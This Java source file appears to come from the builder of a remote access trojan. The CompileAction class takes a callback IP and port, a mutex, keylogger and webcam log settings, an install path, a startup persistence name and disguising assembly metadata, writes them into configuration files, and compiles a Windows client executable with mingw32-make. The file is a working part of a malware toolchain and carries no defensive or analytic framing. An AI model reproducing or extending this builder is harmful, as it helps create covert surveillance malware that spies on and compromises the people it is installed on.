package Builder.Actions;

import Builder.CompilerGUI;
import Builder.Workers.CompileWorker;
import Packets.Compilation.AssemblySettings;
import Packets.Compilation.CompileSettings;
import Compiler.FileModifier;
import Compiler.ClientExtractor;

import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import java.io.File;

import java.nio.file.Path;

public class CompileAction implements ActionListener {

    private final CompilerGUI compilerGUI;
    private final JCheckBox[] checkBoxes;
    private final JTextField[] fieldsArray;
    private final ButtonGroup buttonGroup;


    public CompileAction(CompilerGUI compilerDialog, JCheckBox[] checkBoxesArray, JTextField[] fieldsArray, ButtonGroup buttonGroup) {
        this.compilerGUI = compilerDialog;
        this.checkBoxes = checkBoxesArray;
        this.fieldsArray = fieldsArray;
        this.buttonGroup = buttonGroup;
    }

    // Creating command line for compiling with g++, several options to include on the client
    @Override
    public void actionPerformed(ActionEvent e) {
        JFileChooser chooser = new JFileChooser();
        chooser.setFileFilter(new FileNameExtensionFilter(".exe", "."));
        chooser.setCurrentDirectory(new File(System.getProperty("user.dir")));
        chooser.setSelectedFile(new File("client"));
        chooser.setAcceptAllFileFilterUsed(false);
        int returnVal = chooser.showSaveDialog(compilerGUI);
        if (returnVal == JFileChooser.APPROVE_OPTION) {
            FileModifier uniqueCompiler = new FileModifier(ClientExtractor.localClientFiles);

            // Set IP
            String IP = fieldsArray[0].getText();
            int PORT = Integer.parseInt(fieldsArray[1].getText());
            String TAG_name = fieldsArray[2].getText();
            String MUTEX = fieldsArray[3].getText();
            int TIMING_RETRY = Integer.parseInt(fieldsArray[4].getText());
            String WEBCAM_LOGS = fieldsArray[9].getText(); // Assuming this is the correct field
            String KEYLOGGER_LOGS = fieldsArray[10].getText(); // Assuming this is the correct field
            String INSTALL_PATH = checkBoxes[0].isSelected() ? buttonGroup.getSelection().getActionCommand() : "-1";
            String SUBDIRECTORY_NAME = fieldsArray[6].getText();
            String SUBDIRECTORY_FILE_NAME = fieldsArray[7].getText() + ".exe";
            String STARTUP_NAME = checkBoxes[1].isSelected() ? fieldsArray[8].getText() : "";
            CompileSettings compileSettings = new CompileSettings(IP, PORT, TAG_name, MUTEX, TIMING_RETRY, WEBCAM_LOGS, KEYLOGGER_LOGS,
                    Integer.parseInt(INSTALL_PATH), SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);

            uniqueCompiler.generateConfigurationFile(compileSettings);

            AssemblySettings assemblySettings = new AssemblySettings(
                    fieldsArray[11].getText(),
                    fieldsArray[12].getText(),
                    fieldsArray[13].getText(),
                    fieldsArray[14].getText(),
                    fieldsArray[15].getText(),
                    fieldsArray[16].getText());

            uniqueCompiler.generateAssemblyConfigurationFile(assemblySettings);

            // Create command line
            String utilities = fieldsArray[5].getText();
            String pathOfUtilities = "";

            if (!utilities.equals("g++ / windres")) pathOfUtilities = utilities;
            int cores = Runtime.getRuntime().availableProcessors();
            File selectedFile = chooser.getSelectedFile();


            String compileCommand = Path.of(pathOfUtilities, "mingw32-make").toString();

            compileCommand += " TARGET=\""+selectedFile+".exe\" -j"+cores;

            compilerGUI.getExecutor().submit(new CompileWorker(compilerGUI,compileCommand, ClientExtractor.localClientFiles));
        }

    }
}
